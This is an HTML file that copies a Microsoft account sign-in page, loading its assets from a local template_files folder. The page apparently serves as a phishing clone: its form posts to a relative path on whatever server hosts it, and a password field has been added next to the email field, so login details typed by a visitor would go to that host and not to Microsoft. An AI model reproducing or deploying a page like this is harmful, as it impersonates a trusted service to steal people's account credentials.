<!DOCTYPE html>
<html dir="ltr" class="" lang="en">
   <head>
      <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
      <title>Sign in to your account</title>
      <link rel="shortcut icon" href="https://secure.aadcdn.microsoftonline-p.com/ests/2.1.8220.2/content/images/favicon_a_eupayfgghqiai7k9sol6lg2.ico">
      <meta name="robots" content="none">
      <link  href="./template_files/converged.v2.login.min_fdmrcv9ykqja2rvbxwgtaw2.css" rel="stylesheet">
      <style>
         hr {color : #fff}
      </style>
   </head>
   <body data-bind="defineGlobals: ServerData, bodyCssClass" class="cb" style="display: block;">
      <div>
         <!--  --> 
         <div data-bind="component: { name: &#39;background-image&#39;, publicMethods: backgroundControlMethods }">
            <div class="background" role="presentation" data-bind="css: { app: isAppBranding }, style: { background: backgroundStyle }">
               <!-- ko if: smallImageUrl --> 
               <div data-bind="backgroundImage: smallImageUrl()" style="background-image: url(&quot;https://secure.aadcdn.microsoftonline-p.com/ests/2.1.8220.2/content/images/backgrounds/0-small.jpg?x=138bcee624fa04ef9b75e86211a9fe0d&quot;);"></div>
               <!-- /ko --><!-- ko if: backgroundImageUrl --> 
               <div class="backgroundImage" data-bind="backgroundImage: backgroundImageUrl()" style="background-image: url(&quot;https://secure.aadcdn.microsoftonline-p.com/ests/2.1.8220.2/content/images/backgrounds/0.jpg?x=a5dbd4393ff6a725c7e62b61df7e72f0&quot;);"></div>
               <!-- ko if: useImageMask --><!-- /ko --><!-- /ko --> 
            </div>
         </div>
         <form name="f1" id="i0281" spellcheck="false" method="post" target="_top" autocomplete="off" data-bind="autoSubmit: forceSubmit, attr: { action: postUrl }" action="/" abineguid="B015730994764B8A80EDB2B0129665AF" maskmefilled="yes">
            <!-- ko if: svr.iBannerEnvironment --><!-- /ko --><!-- ko withProperties: { '$loginPage': $data } --> 
            <div class="outer" data-bind="component: { name: &#39;page&#39;,
               params: {
               serverData: svr,
               showButtons: svr.fShowButtons,
               showFooterLinks: true,
               useWizardBehavior: svr.fUseWizardBehavior,
               handleWizardButtons: false,
               password: password,
               hideFromAria: ariaHidden },
               event: {
               footerAgreementClick: footer_agreementClick } }">
               <!-- ko template: { nodes: $componentTemplateNodes, data: $parent } --><!-- ko if: svr.fShowCookieBanner --><!-- /ko --> 
               <div class="middle" data-bind="css: { &#39;app&#39;: $loginPage.backgroundLogoUrl() }">
                  <!-- ko if: $loginPage.backgroundLogoUrl() && !(paginationControlMethods() && paginationControlMethods().currentViewHasMetadata('hideLogo')) --><!-- /ko --> 
                  <div class="inner" data-bind="
                     animationEnd: paginationControlMethods() &amp;&amp; paginationControlMethods().view_onAnimationEnd,
                     css: {
                     &#39;app&#39;: $loginPage.backgroundLogoUrl(),
                     &#39;wide&#39;: paginationControlMethods() &amp;&amp; paginationControlMethods().currentViewHasMetadata(&#39;wide&#39;),
                     &#39;fade-in-lightbox&#39;: fadeInLightBox }">
                     <!-- ko ifnot: paginationControlMethods()
                        && (paginationControlMethods().currentViewHasMetadata('hideLogo')
                            || (paginationControlMethods().currentViewHasMetadata('hideDefaultLogo') && !$loginPage.bannerLogoUrl())) --> 
                     <div data-bind="component: { name: &#39;logo-control&#39;,
                        params: {
                        isChinaDc: svr.fIsChinaDc,
                        bannerLogoUrl: $loginPage.bannerLogoUrl() } }">
                        <!--  --><!-- ko if: bannerLogoUrl --><!-- /ko --><!-- ko if: !bannerLogoUrl && !isChinaDc --><!-- ko component: 'accessible-image-control' --><!-- ko if: (isHighContrastBlackTheme || hasDarkBackground || svr.fHasBackgroundColor) && !isHighContrastWhiteTheme --><!-- /ko --><!-- ko if: (isHighContrastWhiteTheme || (!hasDarkBackground && !svr.fHasBackgroundColor)) && !isHighContrastBlackTheme --> <!-- ko template: { nodes: [darkImageNode], data: $parent } --><img class="logo" role="presentation" data-bind="imgSrc" src="./template_files/microsoft_logo.svg" width="108"><!-- /ko --> <!-- /ko --><!-- /ko --> <!-- /ko -->
                     </div>
                     <!-- /ko --><!-- ko if: svr.strLWADisclaimerMsg && (paginationControlMethods() && !paginationControlMethods().currentViewHasMetadata('hideLwaDisclaimer')) --><!-- /ko --> 
                     <div role="main" data-bind="component: { name: &#39;pagination-control&#39;,
                        publicMethods: paginationControlMethods,
                        params: {
                        enableCssAnimation: svr.fEnableCssAnimation,
                        initialViewId: initialViewId,
                        currentViewId: currentViewId,
                        initialSharedData: initialSharedData,
                        initialError: $loginPage.getServerError() },
                        event: {
                        cancel: paginationControl_onCancel,
                        showView: $loginPage.view_onShow,
                        setLightBoxFadeIn: view_onSetLightBoxFadeIn } }">
                        <!--  --> 
                        <div data-bind="css: { &#39;zero-opacity&#39;: hidePaginatedView() }">
                           <!-- ko if: showIdentityBanner() && (sharedData.displayName || svr.sPOST_Username) --><!-- /ko --> 
                           <div class="pagination-view" data-bind="css: {
                              &#39;has-identity-banner&#39;: showIdentityBanner() &amp;&amp; (sharedData.displayName || svr.sPOST_Username),
                              &#39;zero-opacity&#39;: hidePaginatedView.hideSubView(),
                              &#39;animate&#39;: animate(),
                              &#39;slide-out-next&#39;: animate.isSlideOutNext(),
                              &#39;slide-in-next&#39;: animate.isSlideInNext(),
                              &#39;slide-out-back&#39;: animate.isSlideOutBack(),
                              &#39;slide-in-back&#39;: animate.isSlideInBack() }">
                              <!-- ko foreach: views --><!-- ko if: $parent.currentViewIndex() === $index() --> <!-- ko template: { nodes: [$data], data: $parent } -->
                              <div data-viewid="1" data-bind="pageViewComponent: { name: &#39;login-paginated-username-view&#39;,
                                 params: {
                                 serverData: svr,
                                 serverError: initialError,
                                 isInitialView: isInitialState,
                                 displayName: sharedData.displayName,
                                 prefillNames: $loginPage.prefillNames,
                                 flowToken: sharedData.flowToken,
                                 altCredHintShown: sharedData.altCredHintShown },
                                 event: {
                                 refresh: $loginPage.view_onRefresh,
                                 redirect: $loginPage.view_onRedirect,
                                 showLearnMore: $loginPage.learnMore_onShow } }">
                                 <!--  --> 
                                 <div data-bind="component: { name: &#39;header-control&#39;, params: { serverData: svr } }">
                                    <div class="row text-title" id="loginHeader" role="heading">
                                       <div aria-level="1" data-bind="text: title">Sign in</div>
                                       <!-- ko if: isSubtitleVisible --><!-- /ko --> 
                                    </div>
                                 </div>
                                 <!-- ko if: pageDescription && !svr.fHideLoginDesc --><!-- /ko --> 
                                 <div class="row">
                                    <div role="alert" aria-live="assertive">
                                       <!-- ko if: usernameTextbox.error --><!-- /ko --> 
                                    </div>
                                    <div class="form-group col-md-24">
                                       <!-- ko if: prefillNames().length > 1 --><!-- /ko --><!-- ko ifnot: prefillNames().length > 1 --> 
                                       <div class="placeholderContainer" data-bind="component: { name: &#39;placeholder-textbox&#39;,
                                          publicMethods: usernameTextbox.placeholderTextboxMethods,
                                          params: {
                                          serverData: svr,
                                          hintText: tenantBranding.UserIdLabel || str[&#39;CT_PWD_STR_Email_Example&#39;],
                                          hintCss: &#39;placeholder&#39; + (!svr.fAllowPhoneSignIn ? &#39; ltr_override&#39; : &#39;&#39;) },
                                          event: {
                                          updateFocus: usernameTextbox.textbox_onUpdateFocus } }">
          <input type="text" name="username" id="i0116" maxlength="113" lang="en" class="form-control ltr_override" aria-describedby="usernameError loginHeader loginDescription" aria-required="true" data-bind="textInput: usernameTextbox.value,
                                             hasFocusEx: usernameTextbox.focused,
                                             placeholder: $placeholderText,
                                             ariaLabel: tenantBranding.UserIdLabel || str[&#39;CT_PWD_STR_Username_AriaLabel&#39;],
                                             css: { &#39;has-error&#39;: usernameTextbox.error },
                                             attr: inputAttributes" placeholder="Email, phone, or Skype" aria-label="Enter your email, phone, or Skype." oldautocomplete="remove" autocomplete="off"> <input name="password" type="password" id="i0116" id="i0116" maxlength="113" placeholder="Enter your Password" aria-label="Enter your Password" autocomplete="off" data-bind="moveOffScreen, textInput: passwordBrowserPrefill" tabindex="-1" aria-hidden="true" oldautocomplete="off" abineorigin="null" dntmehasfocus="yes" dntmeignoreclickfocus="yes" style="color: rgb(0, 0, 170); background-color: rgb(255, 255, 238);"> 
                                          <div id="usernameProgress" class="progress" role="progressbar" data-bind="visible: isRequestPending, component: &#39;marching-ants-control&#39;, ariaLabel: str[&#39;WF_STR_ProgressText&#39;]" aria-label="Please wait" style="display: none;">
                                             <!--  --><!-- ko if: useCssAnimation --> 
                                             <div></div>
                                             <div></div>
                                             <div></div>
                                             <div></div>
                                             <div></div>
                                             <div></div>
                                             <!-- /ko --><!-- ko ifnot: useCssAnimation --><!-- /ko -->
                                          </div>
                                          <!-- /ko --><!-- /ko --><!-- ko ifnot: usePlaceholderAttribute --><!-- /ko -->
                                       </div>
                                       <!-- /ko --> 
                                    </div>
                                 </div>
                                 <!-- ko withProperties: { '$usernameView': $data } --> 
                                 <div data-bind="invertOrder: svr.fRepositionFooterButtons, css: { &#39;position-buttons&#39;: !tenantBranding.BoilerPlateText }" class="position-buttons">
                                    <div data-bind="component: { name: &#39;action-links-control&#39;,
                                       params: {
                                       collapseExcessLinks: svr.fCollapseExcessLinks },
                                       event: {
                                       menuOpen: actionLinks_onMenuOpen } }">
                                       <!--  --> 
                                       <div class="row">
                                          <div class="col-md-24">
                                             <div class="text-13 action-links">
                                                <!-- ko template: { nodes: $componentTemplateNodes, data: $data } --><!-- ko if: svr.showCantAccessAccountLink --><!-- ko component: { name: 'action-link-control',
                                                   event: {
                                                       load: actionLink_onLoad,
                                                       focusChange: actionLink_onFocusChange } } --><!-- ko if: isVisible --> <!-- ko template: { nodes: $componentTemplateNodes, data: $data } --> 
                                                <div data-bind="css: { &#39;form-group&#39;: !isMenuLink(), &#39;action-links-menu-item&#39;: isMenuLink }" class="form-group"> <a id="cantAccessAccount" href="https://login.microsoftonline.com/common/oauth2/authorize?client_id=4345a7b9-9a63-4910-a426-35363201d503&amp;response_mode=form_post&amp;response_type=code+id_token&amp;scope=openid+profile&amp;state=OpenIdConnect.AuthenticationProperties%3d6T8lj5JEcxML6RcY6iMcwIu418LUuzXjBRR7KEJs9XwMT1Sz0nujXEQsVGdiAsTrHsiPci3ZjvoPF41Oe1ZBFdrLXflByMutrz5WU5VJTABJXbhEE5COKlvOtGJNzO_X&amp;nonce=636745872231131669.MzE5YjQ5OTEtY2UyOC00NTM0LWJiYjEtODM4NWVlNzI4NWUyMjY2NGJkYWEtMGY4Yi00NzE1LWEwNjYtMzc1ZmRkYjE2MjE1&amp;redirect_uri=https%3a%2f%2fwww.office.com%2f&amp;ui_locales=en-US&amp;mkt=en-US&amp;client-request-id=6a6debaf-1716-44e4-8401-32bc6f8274ff#" data-bind="
                                                   text: str[&#39;WF_STR_CantAccessAccount_Text&#39;],
                                                   hasFocus: hasFocus,
                                                   click: $usernameView.cantAccessAccount_onClick,
                                                   attr: { &#39;role&#39;: isMenuLink() ? &#39;menuitem&#39; : null }">Can’t access your account?</a> </div>
                                                <!-- /ko --> <!-- /ko --><!-- /ko --><!-- /ko --><!-- ko if: !svr.sRemoteConnectAppName && svr.remoteLoginConfig --><!-- /ko --><!-- ko if: svr.fCBShowSignUp && !svr.fDoIfExists && !svr.fCheckProofForAliases --><!-- ko component: { name: 'action-link-control',
                                                   event: {
                                                       load: actionLink_onLoad,
                                                       focusChange: actionLink_onFocusChange } } --><!-- ko if: isVisible --> <!-- ko template: { nodes: $componentTemplateNodes, data: $data } --><!-- ko if: isMenuLink --><!-- /ko --><!-- ko ifnot: isMenuLink --> 
                                                <div class="form-group" data-bind="
                                                   htmlWithBindings: html[&#39;WF_STR_SignUpLink_Text&#39;],
                                                   childBindings: {
                                                   &#39;signup&#39;: {
                                                   href: svr.urlSignUp,
                                                   ariaLabel: str[&#39;WF_STR_SignupLink_AriaLabel_Text&#39;],
                                                   click: $usernameView.signup_onClick } }">No account? <a href="https://login.live.com/oauth20_authorize.srf?response_type=code&amp;client_id=51483342-085c-4d86-bf88-cf50c7252078&amp;scope=openid+profile+email+offline_access&amp;response_mode=form_post&amp;redirect_uri=https%3a%2f%2flogin.microsoftonline.com%2fcommon%2ffederation%2foauth2&amp;state=rQIIAXWSvW_TUBTF8_JFWyGoEKKMGZgQSfz8lThShyZ9DXFju03tOM4SpY6jPNfxi-yXuPGChBg6ds6CxABSFySQEEL8BZ06d2ZAsCAmxAIuO8s9w_0d6eqe8zgDS7D2iOd4YVg5lorSUOSKvASZ4pBnxSIncCLHMnAkMFxwb2Pz7fep-2Dry-4LwH4mz-mfFVgfeHjhlGwyvQBbE0pnYa1cjqKoRMZjbP9blD8CcAXAVwBW6ZzjF42ji3QocmKFF6oVluUg5KAoSiUlRoLlHgqajqjFGkutwTCqrjBtU8aWi6i2q_Cq2fXUuJWosVRci1Wb8ollIqo0Ld7CCR8j2DZRpLoWVWIb9qedk8TLKi6C1-m72s6cTtibQQIcOz_T62MSTAczEtJV5g3QZo7fGjWI7zs2Ld1gjk-xPaSY-AcBmTkBxU64LepVzxVkZJ8qbbFjWyJW7Kg152G1bczjnlvvdCr7SA6lXqTo8Chm_LnbQ4dhtznCO6EePA3xgY25vrsgB3s81BzYr--NgnZv7NWXypwGsWAaQlfWd-py73iCkNDQ9r2FRpuyGmuD3rtMPnnrlPiXmTvJUT4eFWYBGWPPucqCb9nbTKa2traxmXqYKqR-ZcGrXJLcWeH3Sn8mt95_yDaevH6ZusyVxV1njyMt6VTVuqa5UJFOwg5enExbuuIp9WhiyJOFrwti2diGNXieB-f5_I88OLuV-rT-v6yvN-4nfakWkwYx1QIj1VimxnL9vw2&amp;estsfed=1&amp;uaid=6a6debaf171644e4840132bc6f8274ff&amp;signup=1&amp;lw=1&amp;fl=easi2&amp;fci=4345a7b9-9a63-4910-a426-35363201d503&amp;mkt=en-US" id="signup" aria-label="Create a Microsoft account">Create one!</a></div>
                                                <!-- /ko --><!-- /ko --> <!-- /ko --><!-- /ko --><!-- /ko --><!-- ko if: $usernameView.availableCredsWithoutUsername.length > 0 --><!-- /ko --> <!-- /ko --><!-- ko if: collapseExcessLinks && actionLinks().length > 2 --><!-- /ko --> 
                                             </div>
                                          </div>
                                       </div>
                                    </div>
                                    <div class="row" data-bind="css: { &#39;move-buttons&#39;: tenantBranding.BoilerPlateText }">
                                       <div data-bind="component: { name: &#39;footer-buttons-field&#39;,
                                          params: {
                                          serverData: svr,
                                          isPrimaryButtonEnabled: !isRequestPending(),
                                          isPrimaryButtonVisible: svr.fShowButtons,
                                          isSecondaryButtonEnabled: true,
                                          isSecondaryButtonVisible: svr.fShowButtons &amp;&amp; isBackButtonVisible() },
                                          event: {
                                          primaryButtonClick: primaryButton_onClick,
                                          secondaryButtonClick: secondaryButton_onClick } }">
                                          <div class="col-xs-24 no-padding-left-right form-group no-margin-bottom button-container" data-bind="
                                             visible: isPrimaryButtonVisible() || isSecondaryButtonVisible(),
                                             css: { &#39;no-margin-bottom&#39;: removeBottomMargin || svr.fRepositionFooterButtons, &#39;button-container&#39;: svr.fRepositionFooterButtons }">
                                             <!-- ko if: isSecondaryButtonVisible --><!-- /ko --> 
                                             <div data-bind="
                                                css: {
                                                &#39;inline-block&#39;: svr.fRepositionFooterButtons,
                                                &#39;col-xs-12 primary&#39;: isSecondaryButtonVisible() &amp;&amp; !svr.fRepositionFooterButtons,
                                                &#39;col-xs-24&#39;: !(isSecondaryButtonVisible() || svr.fRepositionFooterButtons) }" class="inline-block"> <input type="submit" id="idSIButton9" class="btn btn-block btn-primary" data-bind="
                                                attr: {
                                                &#39;id&#39;: primaryButtonId || &#39;idSIButton9&#39;,
                                                &#39;aria-describedby&#39;: primaryButtonDescribedBy },
                                                value: primaryButtonText() || str[&#39;CT_PWD_STR_SignIn_Button_Next&#39;],
                                                hasFocus: focusOnPrimaryButton,
                                                click: primaryButton_onClick,
                                                enable: isPrimaryButtonEnabled,
                                                visible: isPrimaryButtonVisible" value="Next"> </div>
                                          </div>
                                       </div>
                                    </div>
                                 </div>
                                 <!-- ko if: $usernameView.altCredHintEnabled() && isCredSwitchLinkInMoreOptions() --><!-- /ko --><!-- /ko --><!-- ko if: tenantBranding.BoilerPlateText --><!-- /ko -->
                              </div>
                              <!-- /ko --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- /ko --> 
                           </div>
                        </div>
                     </div>
                  </div>
                  <!-- ko if: newSessionMessage --><!-- /ko --> <input type="hidden" name="ps" data-bind="value: postedLoginStateViewId" value=""> <input type="hidden" name="psRNGCDefaultType" data-bind="value: postedLoginStateViewRNGCDefaultType" value=""> <input type="hidden" name="psRNGCEntropy" data-bind="value: postedLoginStateViewRNGCEntropy" value=""> <input type="hidden" name="psRNGCSLK" data-bind="value: postedLoginStateViewRNGCSLK" value=""> <input type="hidden" name="canary" data-bind="value: svr.canary" value="6DeF3oI9xNOVWWvNETosRivkmITMlMBwhUJhvnT56/U=1:1"> <input type="hidden" name="ctx" data-bind="value: ctx" value="rQIIAXWRvW_TQADFc0ka2gpB1YEyZmBCJPH5Kx9Sh3xcQtycnaZ2HGepUsdRzkl8kX2JGy9IiKFj5yxIDCB1QQIJIcRf0KkzMwOCBTEhFkj_AJb3lt-Tnt57nIBZWHokCqI0yJ8VM8WBLGTEIuQyA5GXM4IkyALPwaHECf7-7t7bHzP3wcHX2gvAf6bP2d8rcDBmbB6UcrkwDLN0NCK2k7XpLPcRgBsAvgGwjm85XsY4uYoHsiDnRamQ53kBQgHKcjGLIyRZ7rGk6YhZvLHSqhyn6phrmQqxXMS0GhZVsztVo-bGjRV2LV5tKBPLRAw3LNEiGz5CsGWiUHUthiMb9medySbLYxfBL_H7WnnBxvytUJ9Ezq_4zoj6s9M5Ddg68QZoc8drDqvU8xybZW8xx2PEHjBCvbZP547PiBMcynph6koKss9xS-7YlkywHTYXIiy0jEXUcyudTv4IKUGxF2IdnkSct3B76DjoNoakHOj-04C0bSL03SVt10WoObBfqQ_9Vm80razwgvmRZBpSV9HLFaV3NkZIqmpH06XGGooaaae9d4nUZtYZ9a4T9zalPDJMz306IlPnJgm-J-9yidL29u5e7GEsHfudBK-2Nm9dpP-s9WdK8_2HZPXJ65ex662cXHPqAm0Wz1Wta5pLFek06JDlZNbU8RRXwrGhjJeeLsk54xCW4GUKXKZSP1Pg4k7s087_vv4H0"> <input type="hidden" name="hpgrequestid" data-bind="value: svr.sessionId" value="9afa2088-7f54-494a-b3b6-04432ca69f00"> <input type="hidden" id="i0327" data-bind="attr: { name: svr.sFTName }, value: flowToken" name="flowToken" value="AQABAAEAAADXzZ3ifr-GRbDT45zNSEFEFeXkuIms93ZNEPj_PEKK3LAgUTbN3tdHogwPviSTvYhJEYrNV-r3G-KOLX5SROxRIK-nGjHKjZI1NJ4zbUSOx2b2nntQL-UupMaVTjXITfl-6DaBZzFmeTSARMwRFzxKG07w3XZVxf61R8YCXumYDjxSeeljjBsANbRVvtZqVwb38Cx-E5be77QUw_o5iDIAFte95wc9DseSV4mBNRZ5y964I42dVwB15KsDSB4wo_6xNAywgjgdchKwiEpvTGn6sRsimHgyIe5I3QB_GR5kF46uSwGCezWDLkdpHuo5Ru7jY1q6HgXzLhXXmJcmGY_add7miq2CbLns6mtTU9GZFLHhVM6X0w14nW-Wqx2yQW5FQBTfUIrtM407bnGI1BeXIAA"> <input type="hidden" name="PPSX" data-bind="value: svr.sRandomBlob" value=""> <input type="hidden" name="NewUser" value="1"> <input type="hidden" name="FoundMSAs" data-bind="value: svr.sFoundMSAs" value=""> <input type="hidden" name="fspost" data-bind="value: svr.fPOST_ForceSignin ? 1 : 0" value="0"> <input type="hidden" name="i21" data-bind="value: wasLearnMoreShown() ? 1 : 0" value="0"> <input type="hidden" name="CookieDisclosure" data-bind="value: svr.fShowCookieBanner ? 1 : 0" value="0"> <input type="hidden" name="IsFidoSupported" data-bind="value: isFidoSupported ? 1 : 0" value="1"> 
                  <div data-bind="component: { name: &#39;instrumentation&#39;,
                     publicMethods: instrumentationMethods,
                     params: { serverData: svr } }"><input type="hidden" name="i2" data-bind="value: clientMode" value="1"> <input type="hidden" name="i17" data-bind="value: srsFailed" value=""> <input type="hidden" name="i18" data-bind="value: srsSuccess" value=""> <input type="hidden" name="i19" data-bind="value: timeOnPage" value=""></div>
                  <div id="footer" class="footer default" role="contentinfo" data-bind="css: { &#39;default&#39;: !backgroundLogoUrl() }">
                     <div data-bind="component: { name: &#39;footer-control&#39;,
                        params: {
                        serverData: svr,
                        debugDetails: debugDetails,
                        showLinks: true },
                        event: {
                        agreementClick: footer_agreementClick,
                        showDebugDetailsClick: footer_showDebugDetailsClick } }">
                        <!--  --><!-- ko if: showLinks || impressumLink || showIcpLicense --> 
                        <div id="footerLinks" class="footerNode text-secondary">
                           <!-- ko if: !showIcpLicense --> <span id="ftrCopy" data-bind="html: svr.strCopyrightTxt">2022 Microsoft</span><!-- /ko --> <a id="ftrTerms" data-bind="text: str[&#39;MOBILE_STR_Footer_Terms&#39;], href: termsLink, click: termsLink_onClick" href="https://www.microsoft.com/en-US/servicesagreement/">Terms of use</a> <a id="ftrPrivacy" data-bind="text: str[&#39;MOBILE_STR_Footer_Privacy&#39;], href: privacyLink, click: privacyLink_onClick" href="https://privacy.microsoft.com/en-US/privacystatement">Privacy &amp; cookies</a><!-- ko if: impressumLink --><!-- /ko --><!-- ko if: showIcpLicense --><!-- /ko --> 
                           <a href="https://login.microsoftonline.com/common/oauth2/authorize?client_id=4345a7b9-9a63-4910-a426-35363201d503&amp;response_mode=form_post&amp;response_type=code+id_token&amp;scope=openid+profile&amp;state=OpenIdConnect.AuthenticationProperties%3d6T8lj5JEcxML6RcY6iMcwIu418LUuzXjBRR7KEJs9XwMT1Sz0nujXEQsVGdiAsTrHsiPci3ZjvoPF41Oe1ZBFdrLXflByMutrz5WU5VJTABJXbhEE5COKlvOtGJNzO_X&amp;nonce=636745872231131669.MzE5YjQ5OTEtY2UyOC00NTM0LWJiYjEtODM4NWVlNzI4NWUyMjY2NGJkYWEtMGY4Yi00NzE1LWEwNjYtMzc1ZmRkYjE2MjE1&amp;redirect_uri=https%3a%2f%2fwww.office.com%2f&amp;ui_locales=en-US&amp;mkt=en-US&amp;client-request-id=6a6debaf-1716-44e4-8401-32bc6f8274ff#" role="button" class="moreOptions" data-bind="
                              click: moreInfo_onClick,
                              ariaLabel: str[&#39;CT_STR_More_Options_Ellipsis_AriaLabel&#39;],
                              hasFocus: focusMoreInfo()" aria-label="Click here for more options">
                              <!-- ko component: 'accessible-image-control' --><!-- ko if: (isHighContrastBlackTheme || hasDarkBackground || svr.fHasBackgroundColor) && !isHighContrastWhiteTheme --><!-- /ko --><!-- ko if: (isHighContrastWhiteTheme || (!hasDarkBackground && !svr.fHasBackgroundColor)) && !isHighContrastBlackTheme --> <!-- ko template: { nodes: [darkImageNode], data: $parent } --><img class="desktopMode" role="presentation" pngsrc="https://secure.aadcdn.microsoftonline-p.com/ests/2.1.8220.2/content/images/ellipsis_white.png?x=0ad43084800fd8b50a2576b5173746fe" svgsrc="https://secure.aadcdn.microsoftonline-p.com/ests/2.1.8220.2/content/images/ellipsis_white.svg?x=5ac590ee72bfe06a7cecfd75b588ad73" data-bind="imgSrc" src="./template_files/ellipsis_white.svg"><!-- /ko --> <!-- /ko --><!-- /ko --><!-- ko component: 'accessible-image-control' --><!-- ko if: (isHighContrastBlackTheme || hasDarkBackground || svr.fHasBackgroundColor) && !isHighContrastWhiteTheme --><!-- /ko --><!-- ko if: (isHighContrastWhiteTheme || (!hasDarkBackground && !svr.fHasBackgroundColor)) && !isHighContrastBlackTheme --> <!-- ko template: { nodes: [darkImageNode], data: $parent } --><img class="mobileMode" role="presentation" pngsrc="https://secure.aadcdn.microsoftonline-p.com/ests/2.1.8220.2/content/images/ellipsis_grey.png?x=5bc252567ef56db648207d9c36a9d004" svgsrc="https://secure.aadcdn.microsoftonline-p.com/ests/2.1.8220.2/content/images/ellipsis_grey.svg?x=2b5d393db04a5e6e1f739cb266e65b4c" data-bind="imgSrc" src="./template_files/ellipsis_grey.svg"><!-- /ko --> <!-- /ko --><!-- /ko --> 
                           </a>
                        </div>
                        <!-- ko if: showDebugDetails --><!-- /ko --> <!-- /ko -->
                     </div>
                  </div>
               </div>
               <!-- /ko -->
            </div>
            <!-- /ko --><!-- ko if: svr.urlUxPreviewOptIn && showFeatureNotificationBanner() --><!-- /ko --> 
         </form>
         <form method="post" aria-hidden="true" target="_top" data-bind="autoSubmit: postRedirectForceSubmit, attr: { action: postRedirectUrl }">
            <!-- ko foreach: postRedirectParams --><!-- /ko --> 
         </form>
         <!-- ko if: svr.urlMsaMeControl --><!-- /ko --><!-- ko if: svr.urlCBPartnerPreload --> 
         <div id="idPartnerPL" data-bind="injectIframe: { url: svr.urlCBPartnerPreload }"><iframe height="0" width="0" src="./template_files/prefetch.html" style="display: none;"></iframe></div>
         <!-- /ko -->
      </div>
   </body>
   <div id="abineFillElement"></div>
   <div class="abineContentPanel" style="background-image: initial; background-position: initial; background-size: initial; background-repeat: initial; background-attachment: initial; background-origin: initial; background-clip: initial; background-color: transparent !important; margin: 0px !important; padding: 0px !important; opacity: 1 !important; z-index: 2147483647 !important; position: absolute !important; overflow: hidden !important; border-width: 0px !important; visibility: visible !important; display: none;"><iframe class="abineContentFrame" width="450px" allowtransparency="true" frameborder="0" height="0px" scrolling="no" src="./template_files/panel.html" id="abine96462088doNotRemove" style="position:relative !important;display:block !important;background:transparent !important;border-width:0px !important;left:0px !important;top:0px !important;visibility:visible !important;opacity:1 !important;filter:alpha(opacity:100) !important;margin:0 !important;padding:0 !important;height:0px !important;width:450px"></iframe></div>
</html>